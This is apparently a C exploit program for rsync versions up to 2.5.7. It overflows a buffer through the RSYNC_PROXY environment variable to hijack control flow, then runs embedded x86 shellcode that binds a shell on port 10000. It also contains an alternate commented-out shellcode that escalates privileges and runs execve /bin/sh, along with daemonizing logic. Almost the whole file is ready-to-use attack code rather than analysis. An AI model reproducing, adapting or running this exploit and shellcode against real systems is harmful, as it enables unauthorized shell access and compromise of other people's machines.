/* 
* rsync &lt;= 2.5.7 Local Exploit
* Saved EIP on stack is overwritten with address of shellcode in memory
* Generally rsync is not setuid or setgid so just a local shell is of no use
* So i used a portbinding shellcode as a PoC of a different attack vector.
* RET is calculated dynamically so payload can be changed just by changing shellcode
* Tested on:
* [eos@Matrix my]$ uname -a
* Linux Matrix 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux
* coded by: abhisek linuxmail org
* Special Thanks: n2n, Hirosh Joseph
*/

#include &lt;stdio.h&gt;
/* Includes for code to daemonize */
#include &lt;signal.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
/****/
#define PATH &quot;/usr/local/bin/rsync&quot;
#define BUFF_SIZE 100
//#define RET 0xbffffdfb

/* 88 bytes portbinding shellcode - linux-x86
* - by bighawk (bighawk warfare com)
*
* This shellcode binds a shell on port 10000
* stdin, stdout and stderr are dupped. accept() arguments are sane.
*/
char shellcode[] =
&quot;\x31\xdb&quot; // xor ebx, ebx
&quot;\xf7\xe3&quot; // mul ebx
&quot;\xb0\x66&quot; // mov al, 102
&quot;\x53&quot; // push ebx
&quot;\x43&quot; // inc ebx
&quot;\x53&quot; // push ebx
&quot;\x43&quot; // inc ebx
&quot;\x53&quot; // push ebx
&quot;\x89\xe1&quot; // mov ecx, esp
&quot;\x4b&quot; // dec ebx
&quot;\xcd\x80&quot; // int 80h
&quot;\x89\xc7&quot; // mov edi, eax
&quot;\x52&quot; // push edx
&quot;\x66\x68\x27\x10&quot; // push word 4135
&quot;\x43&quot; // inc ebx
&quot;\x66\x53&quot; // push bx
&quot;\x89\xe1&quot; // mov ecx, esp
&quot;\xb0\x10&quot; // mov al, 16
&quot;\x50&quot; // push eax
&quot;\x51&quot; // push ecx
&quot;\x57&quot; // push edi
&quot;\x89\xe1&quot; // mov ecx, esp
&quot;\xb0\x66&quot; // mov al, 102
&quot;\xcd\x80&quot; // int 80h
&quot;\xb0\x66&quot; // mov al, 102
&quot;\xb3\x04&quot; // mov bl, 4
&quot;\xcd\x80&quot; // int 80h
&quot;\x50&quot; // push eax
&quot;\x50&quot; // push eax
&quot;\x57&quot; // push edi
&quot;\x89\xe1&quot; // mov ecx, esp
&quot;\x43&quot; // inc ebx
&quot;\xb0\x66&quot; // mov al, 102
&quot;\xcd\x80&quot; // int 80h
&quot;\x89\xd9&quot; // mov ecx, ebx
&quot;\x89\xc3&quot; // mov ebx, eax
&quot;\xb0\x3f&quot; // mov al, 63
&quot;\x49&quot; // dec ecx
&quot;\xcd\x80&quot; // int 80h
&quot;\x41&quot; // inc ecx
&quot;\xe2\xf8&quot; // loop lp
&quot;\x51&quot; // push ecx
&quot;\x68\x6e\x2f\x73\x68&quot; // push dword 68732f6eh
&quot;\x68\x2f\x2f\x62\x69&quot; // push dword 69622f2fh
&quot;\x89\xe3&quot; // mov ebx, esp
&quot;\x51&quot; // push ecx
&quot;\x53&quot; // push ebx
&quot;\x89\xe1&quot; // mov ecx, esp
&quot;\xb0\x0b&quot; // mov al, 11
&quot;\xcd\x80&quot;; // int 80h
/* Shellcode by n2n [n2n@linuxmail.org] used for initial testing */
/*
char shellcode[]=
// setreuid(geteuid(),geteuid()), no use unless rsync is setuid, usually its not 
&quot;\x31\xc0\xb0\x31\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x46\xcd\x80&quot;
// setregid(getegid(),getegid()) 
&quot;\x31\xc0\xb0\x32\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x47\xcd\x80&quot;
// exec /bin/sh 
&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;
// exit() 
&quot;\x31\xdb\x89\xd8\xb0\x01\xcd\x80&quot;;
*/
void handler(int sig) {
int stat;
pid_t pid;
while ((pid = waitpid(-1, &amp;stat, WNOHANG)) &gt; 0) { }
return;
}
void go_daemon() {
int i;
if(fork())
exit (0);
setsid();
i=open(&quot;/dev/null&quot;,O_RDWR);
dup2(i, 0);
dup2(i, 1);
dup2(i, 2);
close(i);
for (i=1;i&lt;64;i++)
signal(i,SIG_IGN);
signal(SIGCHLD,handler);
}
int main(int argc,char *argv[]) {
char *buffer;
int size=BUFF_SIZE,i;
//unsigned long ret_addr=0xbffffffa;
unsigned long ret_addr=0xbffffffa;
//char *expbuff;
char *arg=&quot;localhost::rsync:getaddrinfo:XXX&quot;;
if(argc &gt; 2) {
printf(&quot;USAGE:\n%s BUFF_SIZE\n&quot;,argv[0]);
exit(1);
}
if(argc == 2)
size=atoi(argv[1]);
buffer=(char*)malloc(size);
if(!buffer) {
printf(&quot;Error allocating memory on heap\n&quot;);
exit(1);
}
ret_addr -= strlen(PATH);
ret_addr -= strlen(shellcode);
//ret_addr -= strlen(arg);
/*
expbuff=(char*)malloc(strlen(shellcode)+100);
if(!expbuff) {
printf(&quot;Error allocating memory on heap\n&quot;);
exit(1);
}
memset(expbuff,0x90,strlen(shellcode)+100);
memcpy(expbuff+80,shellcode,strlen(shellcode));
expbuff[strlen(expbuff)-1]=0x00;
*/
for(i=0;i&lt;size;i+=4) 
*(unsigned long*)(buffer+i)=ret_addr; 
memcpy(buffer,&quot;XXX:&quot;,4);
buffer[strlen(buffer)-1]=0x00;
printf(&quot;Using BUFF_SIZE=%d\nRET=%p\n&quot;,size,ret_addr);
setenv(&quot;RSYNC_PROXY&quot;,buffer,1);
setenv(&quot;EGG&quot;,shellcode,1);
/* Daemonizing and executing /usr/local/bin/rsync */
go_daemon();
execl(PATH,PATH,arg,NULL);
return 0;
}
